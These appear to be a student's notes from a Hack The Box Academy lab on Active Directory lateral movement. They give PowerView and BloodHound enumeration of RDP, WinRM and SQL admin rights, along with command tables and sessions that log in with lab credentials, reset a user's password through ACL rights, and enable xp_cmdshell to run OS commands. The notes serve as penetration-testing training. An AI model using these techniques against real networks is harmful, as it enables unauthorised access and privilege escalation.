
Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.


`pass-the hash` == `local admin on host`

IF NO`local admin rights on any hosts in the domain?`
PSRemoting or Windows Remote Management (WinRM)
RDP
`MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods

---

We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:

- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

---
`Enter-PSSession` and `PowerUpSQL` from the Windows attack host and `evil-winrm` and `mssqlclient.py` from the Linux attack host).

# Privileged Access

|Command|Description|
|---|---|
|`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`|PowerView based tool to used to enumerate the `Remote Desktop Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host.|
|`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"`|PowerView based tool to used to enumerate the `Remote Management Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host.|
|`$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force`|Creates a variable (`$password`) set equal to the password (`Klmcargo2`) of a user from a Windows-based host.|
|`$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)`|Creates a variable (`$cred`) set equal to the username (`forend`) and password (`$password`) of a target domain account from a Windows-based host.|
|`Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred`|Uses the PowerShell cmd-let `Enter-PSSession` to establish a PowerShell session with a target over the network (`-ComputerName ACADEMY-EA-DB01`) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (`$cred` & `$password`).|
|`evil-winrm -i 10.129.201.234 -u forend`|Used to establish a PowerShell session with a Windows target from a Linux-based host using `WinRM`.|
|`Import-Module .\PowerUpSQL.ps1`|Used to import the `PowerUpSQL` tool.|
|`Get-SQLInstanceDomain`|PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.|
|`Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'`|PowerUpSQL tool used to connect to connect to a SQL server and query the version (`-query 'Select @@version'`) from a Windows-based host.|
|`mssqlclient.py`|Impacket tool used to display the functionality and options provided with `mssqlclient.py` from a Linux-based host.|
|`mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`|Impacket tool used to connect to a MSSQL server from a Linux-based host.|
|`SQL> help`|Used to display mssqlclient.py options once connected to a MSSQL server.|
|`SQL> enable_xp_cmdshell`|Used to enable `xp_cmdshell stored procedure` that allows for executing OS commands via the database from a Linux-based host.|
|`xp_cmdshell whoami /priv`|Used to enumerate rights on a system using `xp_cmdshell`.|

----
## Remote Desktop

#### Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound
![image](https://academy.hackthebox.com/storage/modules/143/bh_RDP_domain_users.png)

#### Checking Remote Access Rights using BloodHound
![image](https://academy.hackthebox.com/storage/modules/143/execution_rights.png)

`Analysis` tab :
>`Find Workstations where Domain Users can RDP` or 
>`Find Servers where Domain Users can RDP`

## WinRM
PowerView function `Get-NetLocalGroupMember` to the `Remote Management Users` group. This group has existed since the days of Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights.

#### Enumerating the Remote Management Users Group
```powershell-session
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

Get-DomainGPOUser -Computer ACADEMY-EA-MS01 -Right CanPSRemote


ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
```

`Cypher query` in BloodHound:
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![image](https://academy.hackthebox.com/storage/modules/143/canpsremote_bh_cypherq.png)

#### Adding the Cypher Query as a Custom Query in BloodHound

---


#### Establishing WinRM Session from Windows
```powershell-session
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb> 
```
#### Connecting to a Target with Evil-WinRM and Valid Credentials
```shell-session
AhmaDb0x@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend
```

dig around to plan our next move

 ---


## SQL Server Admin

More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance.

We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool [Snaffler](https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings.

BloodHound, once again, is a great bet for finding this type of access via the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

#### Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound

https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet

steps:
```python
use our ACL rights to authenticate with the `wley` user
change the password for the `damundsen` user and then authenticate with the target using a tool such as `PowerUpSQL` via damndsun

Let's assume we changed the account password to `SQL1234!` using our ACL rights. We can now authenticate and run operating system commands.
```

#### Enumerating MSSQL Instances with PowerUpSQL
```powershell-session
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
```

```powershell-session
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

#### Running mssqlclient.py Against the Target
```shell-session
AhmaDb0x@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```
`enable_xp_cmdshell`
```shell-session
SQL> enable_xp_cmdshell
```
```shell-session
xp_cmdshell whoami /priv
```



## Moving On

Every time we gain control over another user/host, we should repeat some enumeration steps to see what, if any, new rights and privileges we have obtained. Never overlook remote access rights if the user is not a local admin on the target host because we could very likely get onto a host where we find sensitive data, or we're able to escalate privileges.



# NOOOOTE
whenever we find SQL credentials (in a script, a web.config file, or another type of database connection string), we should test access against any MSSQL servers in the environment. This type of access is almost guaranteed `SYSTEM` access over a host. If we can run commands as the account we authenticate with, it will almost always have the dangerous `SeImpersonatePrivilege` right.


---




typing `bloodhound` into a CMD or PowerShell console. The credentials should be saved, but enter `neo4j: HTB_@cademy_stdnt!`